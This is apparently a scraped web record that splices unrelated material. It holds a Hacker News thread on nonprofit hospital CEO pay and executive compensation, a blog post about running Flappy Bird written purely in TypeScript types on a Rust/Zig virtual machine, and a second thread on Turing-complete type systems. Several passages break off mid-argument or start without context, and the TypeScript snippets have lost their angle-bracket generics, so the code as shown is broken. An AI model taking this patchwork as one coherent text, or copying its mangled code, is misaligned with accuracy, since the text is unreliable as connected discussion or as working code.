applicable to hospitals that prevent them from refusing to accept medicaid patients for elective procedures. Certaibly there are lots of surgery centers that do refuse medicaid. Also lots of doctors dont take medicaid&#x2F;medicare. Its within their right to do so.[1]: https:&#x2F;&#x2F;en.m.wikipedia.org&#x2F;wiki&#x2F;Emergency_Medical_Treatment_... reply bumby 17 hours agorootparentYou&#x27;re right with regard to emergency treatment; so in the case of the withdrawal patient that holds. But hospitals are not required to accept any insurance, including medicare&#x2F;aide (they are termed \"non-participating\"). So I don&#x27;t think the premise holds in the knee-replacement scenario.So, to be generous, maybe there&#x27;s a case that if a hospital gets a bulk of its revenue from the ER, it&#x27;s a better business case to accept Medicare. But I don&#x27;t believe that&#x27;s the case for most hospitals, so it still leads me to question the premise that medicare is a net negative (or else we&#x27;d see a lot more &#x27;non-participating&#x27; hospitals). reply someguydave 17 hours agorootparentprevSo you are suggesting that costs are primarily set by how much the government is willing to pay, and are completely independent of medical production? reply gniv 17 hours agorootparentprevI think you are right to be suspicious. For example, back when I lived in the US and went for a checkup at a big hospital in NY: first there were greeters at the entrance of the building, then a greeter on the right floor, then a small army of receptionists, then a nurse, then a PA, then the doctor. All these are expenses. Are they necessary? Here in France there is, maybe, a receptionist that sends me to the office where the doctor does everything, including billing. (Frankly, both ways seem a bit extreme.) reply RHSeeger 17 hours agorootparent> Here in France there is, maybe, a receptionist that sends me to the office where the doctor does everything, including billing.If the doctor is making an order of magnitude more for their time than the receptionist, it&#x27;s far more effective to have more receptionists for the work either of them could do. reply gniv 16 hours agorootparentIn principle yes, but the overhead of having an extra person is big. The extra effort done by the doctor is small, especially since a lot of stuff is automated and works well (like appointments and integration with the state insurance). Yes, I was surprised too. reply Jensson 7 hours agorootparentprevThe trick is to pay doctors less, a country can easily lower doctor salaries by educating more doctors, there is no lack of people who want to be doctors. reply RHSeeger 6 hours agorootparentAs I understand it, \"educating more doctors\" in the US is a lot more complicated than it sounds. There&#x27;s a number of different organizations involved, each setting their own limits for their \"step\" of the process; and there&#x27;s motivation to not increase the throughput. reply edmundsauto 17 hours agorootparentprevI believe it is common for the greeters to be vounteers reply s1artibartfast 19 hours agoparentprev>It’s a non-profit largely funded by tax payers.Is it actually government funded, or does it sell services which the government pays for?I dont know if it is Baader–Meinhof phenomenon, but it seems like I increasingly see funded used to describe revenue for services rendered.It seems like a bit of a bait and switch, because the word funded often carries come connotation of ownership, obligation, or charity. reply prasadjoglekar 18 hours agorootparentBoth. The govt gives them a break on taxes. They also pay the hospital thru Medicare and Medicaid. reply s1artibartfast 18 hours agorootparentI wouldn&#x27;t call either of those funding in the sense I described. reply lozenge 18 hours agorootparentprevIsn&#x27;t the Medicare payment less than the hospital gets giving the same treatment to somebody with private health insurance? reply LordDragonfang 18 hours agorootparentprevI&#x27;m not sure the latter holds. That&#x27;s like saying grocery stores are \"government funded\" because they take food stamps - or for that matter, that private retirement homes are \"government funded\" because the retirees get their income from Social Security.And for that matter, the former definitely doesn&#x27;t hold, because nearly every entity gets some tax break. Every homeowner is \"government funded\". reply felipemnoa 19 hours agorootparentprev>>Is it actually government funded,Maybe indirectly. As a charity they get lots of benefits that allows them to save money. reply s1artibartfast 18 hours agorootparentNot taxing money =&#x2F;= giving money.Some of the impacts are identical, but they have other fundamental differences.I pay less than 100% tax, but I wouldn&#x27;t say that the government is funding my lifestyle reply csharpminor 18 hours agoprevCEO salaries should be understood in relationship to the resources that they control. For example, this CEO chose to spend $85M on travel nurses to counter the union strike happening at a hospital in their network. Presumably the CEO thinks that this gamble is worth it in forcing the union’s hand.That may be a terrible decision, but it shows the extent of resources a CEO of a $6bn organization commands. This is one choice out of tens to hundreds of 8-figure choices that this “super manager” will make in a year.If you’re on the board of an organization like that, settling for a second-best CEO to save a 7-figure sum just doesn’t make sense.I raise this for two reasons:1) I find that people have no concept of how to consider whether or not executive pay is reasonable. One of my neighbors was outraged that our Mayor makes $450k. “Could she really be working 6x harder than me?” But our mayor oversees thousands of employees and makes decisions that influence hundreds of millions of dollars of spending. I’d consider her quite underpaid in proportion to what she manages.2) Shaming organizations into lowering exec comp probably won’t work: there’s a strong economic incentive to pay competitively. Just bend the income tax contribution curve so that individuals who make more continue to pay more. reply Escapado 18 hours agoparentWe don’t adjust salary for what proportions people manage or are responsible for in a lot of other fields, at least not to the same extend. And especially if we would go by responsibility. I earn about 3 times as much as the average school teacher in my home town and about 4 times as much as the people driving the buses there while I sit in front of my screen and fix irrelevant css bugs or spin up the next semi-useful microservice for a cross financed project that nobody really cares about except and that doesn’t really help anybody. Their responsibility and utility is much greater than mine. If they fuck up it has much larger and potentially grave consequences. If I fuck up there will be a Jira ticket and a semi-interested PM who will assign it to me 3 weeks down the line. Furthermore this relation does not automatically imply fairness. And on the outside it also appears very asymmetric in personal risk. A megacorp CEO might tank the entire company and can often still walk away with millions. So if we wanted a “fairness” optimized solution then maybe it should take into account the public utility, difficulty of the job, amount of work required and personal risk. And maybe, (just maybe) we don’t need anyone being arbitrarily wealthy and having more assets than some developing countries. reply conradev 18 hours agorootparentI think it is a misunderstanding that the job market is optimizing for fairness: it is not.Executive pay is supply and demand. The mayor is being paid $450k because a person with the necessary skills was willing to take that salary (after fighting off opponents) to become mayor. Mayor comes with prestige, so more people want to be mayor, and $450k is not a terrible incentive to go after. If the government paid $80k a year, no one would become mayor. If they paid $1m a year, too many qualified people might be interested, or – the right people might become interested.Imagine you’re a CEO who successfully ran and sold a business for $250m. You now have at least $25m. Why would you ever want to work an intense job again? Being CEO is exhausting.Executives are paid a lot of money because they’ve already made a lot of money: if you want to incentivize them there has to actually be something at stake.That said, these decisions are usually made by a board, which is small and has limited knowledge.There is plenty of room for them to miscalibrate, too, but paying too much for an executive is bad business. Paying too little is, too. reply Jensson 17 hours agorootparent> That said, these decisions are usually made by a board, which is small and has limited knowledge.The board is usually made up of other executives or former executives. This group sets each others salaries unlike all other professional categories. reply denton-scratch 17 hours agorootparentAs far as I can tell, CEO remunerations are determined by \"the going rate\"; and the directors on the remuneration committee are fine with that, because they&#x27;re also CEOs for some other firm, or hope to be. So the going rate goes up, up, up.Now, here in the UK, the remuneration of University heads (Principal, Master, Dean, or whatever title) are having their pay determined by the going rate for CEOs. These are people who do the job for a couple of days a week; they aren&#x27;t exactly struggling to get on top of the workload. Same for the bosses of the jungle of pseudo-companies that make up the modern NHS; they&#x27;re all basically employed by the taxpayer. They&#x27;ve employed so many managers that their organizations are hopelessly top-heavy, and yet they need huge remuneration.Can they not delegate? I thought the ability to delegate was an essential skill for any manager. reply Escapado 9 hours agorootparentprevI should have been more clear on what I mean: I am well aware that the job market is not optimizing for fairness but that is what people often judge situations on.I do understand how it came to all of this and how the situation is justified but just posed that if we turned our back to completely free markets and imagined a structure based on \"fairness\" then things should probably be different.Furthermore I disagree with the argument that nobody would want to work an intense job while being \"underpaid\". Plenty of labor is really intense and pays minimum wage or barely over. reply ceejayoz 17 hours agorootparentprev> If the government paid $80k a year, no one would become mayor.I very much doubt this. New Hampshire legislators get $100&#x2F;year, since 1889. Still plenty interested in the job. reply conradev 17 hours agorootparentYeah, I would do public service for free, personally, but I have the means to.It’s an interesting filter to pay nothing, for sure! At that point, it is filtering for people who can afford their own lifestyles without a job reply vkou 17 hours agorootparentprevIf executive pay is supply and demand, and has risen stratospherically over the past 40 years, why has the supply of executives failed to meet demand for them? Are we not sending enough people to MBA school? Is there a funnel problem in our educational system? Do we need to open up more opportunities for skilled immigrants to work here in executive roles? reply conradev 17 hours agorootparentThe US has terrible cost disease in a lot of industries, and I would lump executive compensation in with those industries.I don’t think I’ve seen a good coherent theory for this specifically reply hotnfresh 18 hours agoparentprev> CEO salaries should be understood in relationship to the resources that they control.Why? In every other case we’re told wages are set by how much it takes to get someone who can do the job to accept the position. What the company gets out of that person’s work sets a cap on potential compensation, but doesn’t set the actual amount paid. reply csharpminor 16 hours agorootparentBecause understanding CEO pay as a product of organization incentives shows just how futile shaming companies into lower CEO pay is. Just tax the CEOs more and let companies pay what they want. reply ceejayoz 18 hours agoparentprev> If you’re on the board of an organization like that, settling for a second-best CEO to save a 7-figure sum just doesn’t make sense.The idea that boards can effectively determine between first-best and second-best just doesn&#x27;t make sense to me. Ranking job candidates is hard enough in much simpler circumstances. reply csharpminor 16 hours agorootparentI have no illusions that they succeed, I can just tell you that they have a strong incentive to not price discriminate. reply spiderice 18 hours agoparentprevThis all may be true, but it doesn&#x27;t change the fact that I have no interest in donating my money to an organization that is going to give a sizable chunk of it to some rich CEO rather than the people that I&#x27;m trying to donate to. reply parineum 17 hours agorootparentSounds like some pretty solid market effects. reply cscurmudgeon 18 hours agorootparentprevEven public money goes to such charities.https:&#x2F;&#x2F;www.sfchronicle.com&#x2F;sf&#x2F;article&#x2F;CEO-of-S-F-nonprofit-... reply renewiltord 18 hours agorootparentprevYou’re donating to rwbj? Why? That’s dumb af. It’s like donating to IKEA because it’s owned by a non profit. It’s a business that has exploited a regulatory system.The only reason you’d donate to this hospital or Harvard or any other such exploits is if you think it’ll get you something: earlier treatment, admissions for your kids and so on.If you want that and you know the game and you want the CEO to be paid less I don’t know what to say. reply vsareto 18 hours agoparentprev>But our mayor oversees thousands of employeesChances are they engage with much less and obviously don&#x27;t have interactions with thousands of people and are keeping all of that straight in their head, so this is not a good reason.You don&#x27;t get credit because you oversaw a public worker whom you&#x27;ve never engaged with.>makes decisions that influence hundreds of millions of dollars of spendingThey also have access to (sometimes) smart people to filter through information and distill it down for them which is honestly the hardest part, not the decision making. It is unlikely they are compensated compared to the work they put in.I&#x27;m not saying the job is easy, but they aren&#x27;t doing it all themselves and the core problem is that the people underneath them are probably making no where near $450k. Salary just doesn&#x27;t correlate to actual effort these days.That said, $450k for a mayor is fine. Someone who can become a mayor can easily be a corporate executive making millions. reply csharpminor 17 hours agorootparentCurious to know, what threshold would not be fine and how did you get there? My point is that you’re implicitly using the same method most exec comp committees use to set CEO salaries. reply magicalist 18 hours agoparentprev> That may be a terrible decision, but it shows the extent of resources a CEO of a $6bn organization commands. This is one choice out of tens to hundreds of 8-figure choices that this “super manager” will make in a year.This argument sounds a lot like it doesn&#x27;t matter what decisions they make as long as they&#x27;re in charge of a lot of capital.> If you’re on the board of an organization like that, settling for a second-best CEO to save a 7-figure sum just doesn’t make sense.If this is the only thing checking bad decisions, we have to consider that when there&#x27;s a little oligarchy of buddies controlling an immense concentration of capital deciding each other&#x27;s compensation, there are different market forces at work. reply laboratorymice 17 hours agoparentprevThe argument that this is simply the market rate required to attract a person with the required skills can be proven false in so many ways, for example:1. It&#x27;s not a market, there is no job advertisement for the CEO role that the general population can apply for. If there were, and if it were to offer a fraction of \"market\", there would still be thousands of applications, and the top 1% of those candidates would absolutely do the job as well or better than the typical hand-picked candidate.2. There are several roles in society that place enormous responsibility on those professionals and that only a handful of people in the world can do well, yet those jobs still pay low 6figures max. For example, nuclear engineer, aerospace engineer, state leader, and yes, ironically, most public hospital directors.The sad reality is that executive pay is simply a result of incentives and the fact that corporate hierarchy gets very thin at the top. It has no relation to the competence or direct value-added of the executive. reply csharpminor 16 hours agorootparentI don’t agree on your first point. I do think power and talent is highly consolidated among a small number of executives. Especially when you look at (as most boards do) executives within a specific industry vertical.That’s not to say those people guarantee success, but it is less of a risk than picking someone unknown and without the established network and direct relevant experience.Again all this to say I don’t think shaming companies into paying less will work, we should just tax CEOs more and let companies pay what they want. reply coderintherye 18 hours agoparentprev>If you’re on the board of an organization like that, settling for a second-best CEO to save a 7-figure sum just doesn’t make sense.You&#x27;re falsely associating higher pay with performance, when oftentimes they can be inversely correlated.https:&#x2F;&#x2F;www.wsj.com&#x2F;public&#x2F;resources&#x2F;documents&#x2F;CEOperformanc...https:&#x2F;&#x2F;www.gsb.stanford.edu&#x2F;insights&#x2F;when-ceos-are-paid-bad...https:&#x2F;&#x2F;www.epi.org&#x2F;blog&#x2F;ceo-pay-still-not-related-to-perfor... reply csharpminor 17 hours agorootparentI didn’t say anything about performance. What I said is that it’s untenable for a board to penny-pinch a few million dollars for someone managing orders of magnitude more in resources.A board gains nothing from pointing to a 2005 Stanford GSB blog post if a CEO they hired runs the company into the ground.Again, all this to say we should just tax CEOs more and let companies pay what they want. reply coderintherye 16 hours agorootparent>second-bestYour performance comment is right there. What else is \"second-best\" other than a comment on performance? reply hliyan 18 hours agoparentprevIf we measure a leader&#x27;s potential value by their potential impact&#x2F;damage radius, then it follows that their actual pay should be proportional to the actual impact&#x2F;damage they cause. The problem here is that leaders seem to be compensated in proportion to their impact, but not penalised in proportion to their damage, even when their success is indistinguishable from chance. reply csharpminor 17 hours agorootparentI agree with you. I’m not sure what the enforcement mechanism would be though. Boards suing CEOs more frequently over negligence? CEOs buying a certain amount of equity in a company before they join?CEOs are highly leveraged. One wrong bet could cost the company&#x2F;employees&#x2F;shareholders more than a CEO (even a multi-millionaire) could repay.In reality this leaves the board with recouping maybe a few million from the CEO on a shortfall that may be orders of magnitude bigger. I think pragmatically most boards just move on, let the CEO take the reputations hit, and focus on trying to find someone better. reply tremon 18 hours agoparentprevsettling for a second-best CEO [..] doesn’t make senseIs there any indication that the CEO was premier tier other than the size of his compensation package? reply avalys 18 hours agoparentprevI like to consider CEO salaries by the amount they’re getting paid, per employee in the company.There was a bunch of complaining recently about GM CEO Mary Barra, whose annual compensation is around $30M. GM has around 167,000 employees, so this corresponds to about $180 per employee.The average employee compensation at GM is around $100,000 per year.I wonder, did each employee get more than $180 of value from Mary Barra’s leadership? reply csharpminor 18 hours agorootparentI like this as a more precise back-of-the napkin method than what I articulated. I’m not up-to-date with GM and Barra’s tenure.What I can say is that I’ve personally seen bad leadership teams cost employees much more than $180&#x2F;year. As a board, it’s hard to look at that prospect and and go cheap on someone with the potential to destroy or create that much wealth. reply avalys 17 hours agorootparentThat&#x27;s a great way to look at it as well. reply a_cardboard_box 18 hours agoparentprevWe shouldn&#x27;t have unelected individuals making choices that have such a high impact on society in the first place. You&#x27;ve detailed the mechanisms behind their high pay, but that is far from justifying it. reply parineum 17 hours agorootparentI think we should have withheld the theory of relativity because it eventually led to weapons of mass destruction. At least pending a vote of electing Einstein to be a scientist and a subsequent vote on publishing the theory. reply carlosjobim 18 hours agorootparentprevThe CEO is elected by the board and the board is elected by the shareholders. reply denton-scratch 17 hours agoparentprev> settling for a second-best CEO to save a 7-figure sum just doesn’t make sense.Really? You expect the CEO to make all significant decisions, all on his own? No wonder you think the CEO of a billion-dollar company needs a 7-digit salary.I think the main job of CEO is to appoint useful directors, and promote competent managers. That&#x27;s certainly a challenging job; but it&#x27;s a job you can learn, like any management job. I&#x27;d even agree that most people are unsuited to that work, as most people are unsuited to any kind of management.But it doesn&#x27;t call for some kind of superstar, a one-off snowflake \"talent\".> But our mayor oversees thousands of employees and makes decisions that influence hundreds of millions of dollars of spending.Right; arguably your Mayor might be worth $450K. I&#x27;d be upset about my representative being paid that much out of scarce public funds; but that&#x27;s not even in the same ballpark as the going rate for the CEO of a billion-dollar company. reply csharpminor 17 hours agorootparentI’m engaging in good faith, no need for ad-homonyms.No, I do not expect a CEO to make those decisions on their own. They also usually bring a team (or make choices about who to keep&#x2F;remove). So even if they’re not deciding directly, they’re only a step or two removed. Many of the multi-million dollar bets being placed might just be on who to hire to make a decision and execute.Incidentally, those key hires are often why CEOs command such a price. Their price simply reflects that power in human networks is highly consolidated. CEOs absolutely leverage their position as gatekeepers here.All this to say why I don’t think we’ll be successful in curbing CEO pay, and should instead just focus on taxation. reply denton-scratch 16 hours agorootparentNo \"ad-homonym\" (I like that version!) I didn&#x27;t attack you, I critiqued your remarks (you can tell, because I cited them). reply TrinaryWorksToo 17 hours agoparentprevOdd, when I complain that my salary should be higher because of the impact the work I do makes, they don&#x27;t raise my salary. reply lesuorac 18 hours agoparentprev> Shaming organizations into lowering exec comp probably won’t work: there’s a strong economic incentive to pay competitively.Well I think you&#x27;re right on the first half but I don&#x27;t think you&#x27;re correct on the second half.Paying a CEO 5M vs 17M is a rounding error to a double-digit billion dollar company. Its like getting something on Amazon instead of Alibaba, sure Amazon is 3x the price but you obviously find the item cheap enough otherwise you&#x27;d be on Alibaba. Or perhaps you want the item now and don&#x27;t want to spend months searching for a new CEO. reply csharpminor 18 hours agorootparentI’m not sure I understand you, I believe we’re making the same point? I mean that there’s a strong incentive to offer competitive pay (as in pay more e.g. to poach from a competing company). reply lesuorac 17 hours agorootparentYeah, I guess you&#x27;re right. The CEO has the retention&#x2F;switching costs amortized in their salary unlike probably the entire rest of the company.A company might take a 30k hit letting a 50k&#x2F;yr employee walk away but they won&#x27;t raise their salary to 56k to keep them from walking. But w.r.t. a CEO they will raise their salary from of 5M to 17M so that investor confidence won&#x27;t tumble by them quitting. reply JKCalhoun 17 hours agoparentprev> This is one choice out of tens to hundreds of 8-figure choices that this “super manager” will make in a year.I had heard the opposite — from Steve Jobs no less.

This article is about nonprofits. reply BariumBlue 18 hours agoparentprevWasn&#x27;t there analysis that company performance is inversely correlated to CEO compensation?I remember seeing a chart, though I don&#x27;t remember whether the analysis was well done & researched or not reply prerok 17 hours agorootparentI have not seen it but, to me, it kind of makes sense if you put an average overall.I think companies making a lot of money are in a world of trouble: sweet trouble, to be sure, but still trouble.Sustaining the same percentage growth is incredibly difficult once you are big. So, what is there to do? Expand to new markets, create new products with the potential to destroy your existing ones, fire people you think are no longer needed? Decisions that will either make more money or destroy the company. And, no matter what anyone else would say, I think their decisions are worse than half chance.In the end we praise the CEOs that made the \"right\" choice. But it was the right choice only in hindsight, it could easily have gone in the other direction, as many many examples of previously successful CEOs have shown.Nobody stays on top forever and that&#x27;s just how it is.Now, as for the CEOs&#x27; salaries: they are the same regardless of their successful choices. So, when you average it out, it would look like it is inversely proportional, simply because more companies tank than stay on top. reply optymizer 18 hours agoparentprev> CEO salaries should be understood in relationship to the resources that they controlWhy? reply csharpminor 17 hours agorootparentBecause it’s useful to understand the incentives driving higher exec pay. My point is that shaming organizations into reducing CEO pay is unlikely to work given the incentives, so we should just focus on individual progressive taxation and let companies pay what they want. reply nonameiguess 18 hours agoparentprevFrankly, I think this sort of thinking is wrong almost all of the time. I understand why hiring boards feel they have no choice, but the reality is, outside of maybe 15 people from the past century, there are no clear number ones and number twos. Talent ranking just isn&#x27;t that accurate. Pro sports has exactly the same problem. If you happen to actually get a LeBron James or Shohei Ohtani, then yeah, they absolutely deserve probably 50 times what they&#x27;ll ever actually get paid. They&#x27;re worth more than the rest of the team combined.But if you don&#x27;t have them, you&#x27;re locking yourself into a supermax contract for Russell Westbrook or John Wall and scuttled your franchises hopes of winning for at least the next decade until you get the balls to suck it up and blow up the entire organization and admit you were wrong.A tiny number of elite individuals are legitimately worth all the damn money in the world, but they&#x27;re nearly impossible to identify in advance. But that promise sucks in the money men to pay these ridiculous salaries out of sheer hope that maybe they&#x27;ll strike gold even though they almost never do. Hell, it&#x27;s even worse in business because someone can just get lucky for a really long time. Market conditions you didn&#x27;t even see coming might nonetheless make you look like a genius just for making a correct guess. At least in sports the winners are actually the best at what they do. reply csharpminor 17 hours agorootparentI completely agree that it’s a crap-shoot, but again from the perspective of a board they’d rather cover their bases and over pay. Especially when this compensation is a fractional percent of the company’s revenue.The other factor is that when you’re on an exec search team, you just look at other executives in the same industry. There might only be 5-10 total that have similar qualifications and are in your comp range. The core issue is that power and relationships within a given industry are typically very concentrated so there’s a limited pool to draw from if you want an exec (and most boards do) who brings that. reply gniv 18 hours agorootparentprevI think in this context second-best CEO is euphemism for crook.

We have to understand how to set compensation to attract them.\"- So the board hires an executive compensation consultant.- \"If you want better than average, you have to pay above average.\" So they target something like 85th percentile compensation for their market.- No board goes into an executive search saying \"We want a mediocre CEO, so we&#x27;ll pay below market.\" Over time, executive compensation ratchets upwards everywhere.Non-profits, in theory, serve a societal&#x2F;community purposeTrue of charities and certain other classes of non-profits, not true of other non-profits unless “societal&#x2F;community purpose” is reduced to a meaningless phrase covering every possible purpose besides returning profits, including enabling a group of sppnsoring firms to earn bigger profits. reply ceejayoz 19 hours agorootparentThe list of \"Exempt Organization Types\" on https:&#x2F;&#x2F;www.irs.gov&#x2F;charities-and-nonprofits is pretty heavily societal&#x2F;community style purposes.

That said, charity care is probably better measured vs a hospital’s net income absent any such care.

How you come to those numbers is left to the reader. You&#x27;d also generate &#x27;baseline&#x27; for other expenses.Then you compare given hospitals to those numbers and where they exceed them, that is counted as \"income\" - if they&#x27;re paying the CEO 2m vs the 1m expected, that&#x27;s 1m of income. reply LanceH 19 hours agoparentprev [–] I imagine there is an enormous amount of charity care (in dollar terms at least) from people going to the ER and never paying. replyGuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",

    "originLink": "https://zackoverflow.dev/writing/flappy-bird-in-type-level-typescript/",
    "originBody": "zackoverflow Home Twitter GitHub 10/19/2023 Flappy Bird Implemented in Typescript types The ultimate type-level trickery I wrote a 2D flappy bird game, purely in Typescript types: Yes you heard that right, this game is written entirely in Typescript type annotations, which—if you didn’t know—are Turing complete. So how the hell am I runnning it in the browser and rendering the game in Typescript types? The basic rundown is that I created a type-level Typescript runtime, allowing Typescript types to be run outside of the Typescript compiler/language server. This “runtime” is a custom VM implemented in Zig, which executes a custom bytecode format I compile Typescript code into. Let me go into more detail. (Run the game here) The gameλ Now, the actual type-level Typescript code for the game is surprisingly simple. First, you must understand that type-level Typescript is like a purely functional programming language. A key tenet of pure and functional programming languages is that state is immutable. So instead of mutating some global game state (bird position, the pipes, etc.), we thread the game state through a series of functions which each return a new copy of the game state updated. Every frame, the game does something like this: type newGameState = MovePipes>> I find this elegantly beautiful, it’s very clear to see the transformations that happen on the game state. The next tricky part is rendering the game. We need to draw the bird, the pipes, and the background. Drawing inspiration from graphics APIs, I had the idea to give the game state a command buffer: an array of drawing commands. A draw command looks a bit like this: export type DrawCommand = // Draw an image/sprite{ type: DrawCommandKindImage; img: string; x: number; y: number; width: number; height: number; } // Clear the screen{ type: DrawCommandKindClearCanvas; x: number; y: number; width: number; height: number; }; Then the task of “rendering” is really just filling the command buffer with the appropriate draw commands to display our game, which can be neatly done at the end of our game state transformations: // Returns new GameState with draw commands for this frame added type Draw = State & { drawCommands: [ // Draw the background { type: Image; imgUrl: \"/background.png\"; x: 0; y: 0; width: canvasWidth; height: canvasHeight; }, // Draw the bird { type: Image; imgUrl: \"/bird.png\"; x: birdX; y: birdY; width: birdW; height: birdHeight; }, // Draw every pipe ...DrawPipes ]; }; Each frame, the game state is updated, the command buffer populated, and then the runtime takes these draw commands and executes them. And that’s the core game loop! Obviously, I skipped over a lot of details. The rest is just mostly verbose Typescript code for checking collision of the bird on the pipes, ground etc. You can check out the full game code here. The runtimeλ So how does this runtime work? There are two main parts: The compiler: Written in Rust, takes Typescript source code and spits out bytecode The VM: Written in Zig, a custom stack-based virtual machine that runs the bytecode to evaluate types I’ve compiled the runtime to Wasm, so it takes the draw commands from the game and executes them using the web canvas API. Conceptually, the runtime could use any graphics backend like OpenGL, Vulkan, Metal, etc. The VM has specialized instructions for computations that would otherwise be expensive in regular type-level Typescript. A prominent group of such expensive computations are arithmetic operations. In type-level Typescript, you can “hack” arithmetic by using arrays, or template strings. Both are extremely expensive operations, especially in comparison to how trivial arithmetic is for the CPU to compute normally. I decided to provide a standard library with functions that get compiled into specialized and very performant instructions in the VM: import { // Prints a value to console Print, // Addition Add, // Subtraction Sub, // Less-than-or-equal-to operator Lte, } from \"std\"; // Compute the Xth fibonnaci number type Fib = Lte extends true ? X : Add>, Fib>>; // The \"main\" function // Compute the 35th fibonacci number and print it export type Main = Print>; I’m pretty excited about all the cool optimizations I can implement in the VM. I mentioned earlier that type-level Typescript is like a purely functional programming language. We can actually borrow a lot of cool optimizations from the implementation of FP languages: Performant immutable data structures: hash array mapped tries, RRB trees Specialized reference counting with reuse (Perceus) Tail call optimization (I’ve already implemented this) Why Zig and Rustλ I’m pretty happy with the split of using Rust for the frontend, and Zig for the hardcore low-level implementation of the VM. Rust’s high-level and zero-cost abstractions make it well suited for walking ASTs and generating bytecode, with speed. Also, instead of writing another Typescript parser, I get to leverage the Typescript parser of the oxc project, which is the best JS/TS parser I’ve used so far1. The future: tyvm, a performant type-checkerλ This type-level Typescript runtime started out as a type-checker for Typescript I call tyvm. The idea of using a VM to exponentially speed up type-checking has been tried before. I decided to try my hand at it because: I just find this stuff fun! I had the idea to focus on supporting only type-level Typescript first. My plan was that, because of the simplicity of just type-level Typescript, we could nail down that aspect first, before moving onto type-checking the entirety of Typescript. This would allow tyvm to be useful far more quickly. An example is that it could be used for Typescript tooling. There are a lot of tools that convert Typescript types to X (where X is something like GraphQL, Prisma schemas, JSON types, etc.), but all of them are pretty limited by not being able to support complex Typescript types. This could jumpstart my dream of making type-level Typescript a very powerful DSL for writing schemas. For example: export type User = { id: string; name: string; age: number; }; export type Mutation = { updateUser: (args: { id: User['id'], fields: Partial> }) => Promise } When running the updateUser mutation, we can update any field from the User type (except for its ID of course). Without Typescript types, I’d have to rewrite all the field types, and that can be error prone if I change User but forget to update the mutation arguments. To me it’s way more expressive to use Typescript’s type manipulation utilities to write schemas. Check out the code for the flappy bird game and tyvm here! Footnotesλ 1 Boshen has done amazing work on oxc. Something I love about his design of the JS/TS AST is that it is arena allocated using the bumpalo crate. This makes building the AST very fast, and also makes AST nodes very slim which is great for CPU cache locality and performance too. Got any questions? Did I say something completely bogus and wrong?

But when there is a solution, the compiler provides it:``` Error: This match case could not be refuted. Here is an example of a value that would reach it: Grid (A, B, C, D, C, D, A, B, B, A, D, C, D, C, B, A) ``` reply zogrodea 12 hours agoparentThat&#x27;s actually pretty amazing. Thank you for the link. reply furyofantares 17 hours agoprevExtremely cool. I&#x27;d say you wrote a game engine in Zig and Rust, which allows you to write games entirely in the TypeScript type system, and you wrote Flappy Bird in that engine. reply quickthrower2 6 hours agoparentYes… and that makes it more impressive than just running this one game. It opens up type driven development to anyone who can do typescript. reply DoughnutHole 15 hours agoprevI guess we’re going to have to coin Atwood’s Second Law> Any application that can be written in JavaScript, will eventually be written in TypeScript types reply sunnybythesea 18 hours agoprevNot related to this post, but man his other project https:&#x2F;&#x2F;aussieplusplus.vercel.app&#x2F; is hilarious and ingenious :) reply joshmanders 16 hours agoparent> You can break out of a loop by saying MATE FUCK THIS:That gave me a hearty chuckle because usually when I write `break` in a for loop, I say in my head the same thing. reply _the_inflator 16 hours agorootparentGot a rule to filter for certain cuss words.

Search for lolcode and cheflang. reply ryandvm 17 hours agoprevProps to the implementor for sure, but I dunno, if a specification is supposed to solve a problem in a very limited niche, but can actually do something like this, I feel like the spec is actually _too_ flexible.I feel the same way about \"Quake implemented in CSS\" demos. Like, very cool, but you actually should not be able to do that... reply tshaddox 16 hours agoparentFor TypeScript I&#x27;m not really sure what you would expect them to change just to avoid being Turing complete. Its Turing completeness is a straightforward consequence of its basic building blocks: iteration, conditional types, and recursive type definitions. Of course TypeScript could go out of its way to avoid Turing completeness by just specifying a maximum recursion depth or something similar, but why? reply RussianCow 16 hours agorootparent> specifying a maximum recursion depth or something similarDoesn&#x27;t TS do exactly this? It doesn&#x27;t seem like setting a cap on recursion depth would disqualify something from being Turing complete. Or am I misunderstanding your comment? reply explaininjs 14 hours agorootparentWhen recursion is the only method of iteration, of course it would. reply smacke 12 hours agorootparentIs the recursion limit an implementation detail of the compiler though, or something statically built into the language? If the former there&#x27;s nothing to prevent the language itself from being Turing complete.(Similar to how every Turing complete programming language today runs on something technically weaker than a Turing machine due to finite memory.) reply olalonde 6 hours agorootparentprevWhat is the other method of iteration? Also, TypeScript does have a recursion limit[0].[0] https:&#x2F;&#x2F;herringtondarkholme.github.io&#x2F;2023&#x2F;04&#x2F;30&#x2F;typescript-... reply CSMastermind 6 hours agorootparentDo you mean within a state machine or in practice?Iteration (loops) are typically represented as jump or branch instructions while recursion requires the creation of a new stack frame on the call stack. reply olalonde 6 hours agorootparentNo, in TypeScript&#x27;s type system. As far as I know, recursion is the only method of iteration but the comment I was replying to seemed to imply otherwise. replyZamicol 14 hours agorootparentprev>Turing completeness could be disabled, if it is checked that a type cannot use itself in its definition (or in a definition of an referenced type) in any way, not just directly as it is tested currently. This would make recursion impossible.That sounds like a reasonable resolution.https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;TypeScript&#x2F;issues&#x2F;14833 reply n2d4 13 hours agorootparentYou can&#x27;t do that because recursion is a feature, not a bug. It lets you do really cool things, such as: type MultiDimArray = T[]MultiDimArray[]; type LinkedList = { value: T, next: LinkedListnull, }; type Json = stringnumbernullJson[]{ [k: string]: Json }; reply mostlylurks 8 hours agorootparentprevNot allowing types to be nested within themselves would be a massive downside. You&#x27;d lose the ability to model anything tree-like in a reasonable manner. There are some obvious workarounds, but they&#x27;re so inconvenient that nobody using a scripting language would ever want to be limited to using them. reply krapp 12 hours agorootparentprevPossibly a dumb question but why would Turing incompleteness be desirable in a language whose entire purpose is generating code in a Turing complete language? reply MobiusHorizons 10 hours agorootparentThe problem being discussed is not that typescript the language that compiles to JavaScript is Turing complete, but rather that typescript types the compile time code necessary to validate that typescript are Turing complete. The consequence is compilation speed foot guns, readability and complexity. Not the end of the world, but the sort of thing some people reasonably consider a downside reply koito17 11 hours agorootparentprevI&#x27;m not an expert on type theory, but I would guess \"Turing complete types\" make type checking an undecidable problem, similar to how dependent types make type inference undecidable, since dependent types let you more or less encode arbitrary things into a type (e.g. p is a value of type Prime). That at the very least gives you an infinite search space, and the possibility to encode e.g. a halting property into types. reply jongjong 8 hours agorootparentprevIMO, TypeScript fails as a developer tool. Developer tools should guide the developer towards making good decisions. TS guides developers towards making poor decisions by facilitating code with complex interfaces.JavaScript taxes interface complexity through increased cognitive load. Typescript frees developers from that tax and harms architecture in the process.Funny how business gurus keep saying over and over that incentives are everything and yet when it comes to choosing developer tools for their businesses, they choose tools which promote terrible incentives, instead they 